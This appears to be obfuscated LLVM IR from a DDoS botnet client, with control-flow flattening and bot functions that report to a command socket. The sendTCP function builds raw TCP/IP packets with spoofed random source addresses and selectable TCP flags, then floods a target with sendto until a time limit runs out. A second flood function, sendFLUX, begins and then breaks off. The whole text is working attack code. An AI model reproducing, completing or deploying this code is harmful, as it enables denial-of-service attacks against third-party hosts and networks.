; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %32, align 4
  %297 = add i32 %296, 1
  store i32 %297, i32* %32, align 4
  %298 = load i32, i32* %33, align 4
  %299 = load i32, i32* %15, align 4
  %300 = icmp eq i32 %298, %299
  %301 = select i1 %300, i32 366402629, i32 562601776
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %16, align 4
  %304 = mul nsw i32 %303, 1000
  %305 = call i32 @usleep(i32 %304)
  store i32 0, i32* %33, align 4
  store i32 -1503697733, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i32, i32* %33, align 4
  %308 = add i32 %307, 1
  store i32 %308, i32* %33, align 4
  store i32 -1503697733, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %310)
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %309, %306, %302, %295, %294, %293, %288, %261, %256, %254, %241, %240, %215, %210, %208, %168, %162, %161, %157, %152, %147, %146, %143, %137, %134, %129, %128, %125, %121, %114, %113, %112, %107, %103, %99, %88, %78, %77, %69, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2083511931, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2083511931, label %first
    i32 1416624259, label %31
    i32 1573328528, label %35
    i32 1994349198, label %40
    i32 2024078426, label %46
    i32 213161573, label %47
    i32 -799492261, label %54
    i32 1672353813, label %57
    i32 -1471961579, label %63
    i32 -304032297, label %66
    i32 -762662331, label %70
    i32 -827908272, label %71
    i32 1083185148, label %77
    i32 -452385929, label %125
    i32 -1938594729, label %161
    i32 -613895698, label %164
    i32 1360996480, label %168
    i32 1696432710, label %173
    i32 -2050307378, label %181
    i32 -2019765276, label %186
    i32 -1536847963, label %194
    i32 120903796, label %199
    i32 1188380404, label %207
    i32 282362766, label %212
    i32 -533579424, label %220
    i32 -1218119955, label %225
    i32 909069718, label %233
    i32 799050384, label %237
    i32 -999710215, label %238
    i32 1381842905, label %239
    i32 270988307, label %240
    i32 -499500368, label %241
    i32 -476294266, label %243
    i32 1406603914, label %244
    i32 -644397673, label %262
    i32 1249202224, label %264
    i32 -168153371, label %269
    i32 -228045625, label %293
    i32 -2039468382, label %294
    i32 -1208012046, label %341
    i32 -490537721, label %346
    i32 483608668, label %347
    i32 -391604199, label %348
    i32 791726578, label %351
    i32 -451804324, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1416624259, i32 1573328528
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 1994349198, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 1994349198, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 2024078426, i32 213161573
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -451804324, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1672353813, i32 -799492261
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  store i32 -451804324, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -1471961579, i32 -304032297
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  store i32 -451804324, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -762662331, i32 -827908272
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 1083185148, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 1083185148, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @GetRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 -1938594729, i32 -452385929
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 1406603914, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 -613895698, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 1360996480, i32 -476294266
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -2050307378, i32 1696432710
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -499500368, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -1536847963, i32 -2019765276
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 270988307, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 1188380404, i32 120903796
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 1381842905, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -533579424, i32 282362766
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 -999710215, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 909069718, i32 -1218119955
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 799050384, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i32 0, i32 0), i8* %235)
  store i32 799050384, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -999710215, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1381842905, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 270988307, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -499500368, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 -613895698, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 1406603914, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 -644397673, i32 1249202224
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -168153371, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 -168153371, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -228045625, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -2039468382, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @GetRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 -1208012046, i32 -391604199
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 -490537721, i32 483608668
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 791726578, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -228045625, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 -228045625, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 -451804324, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
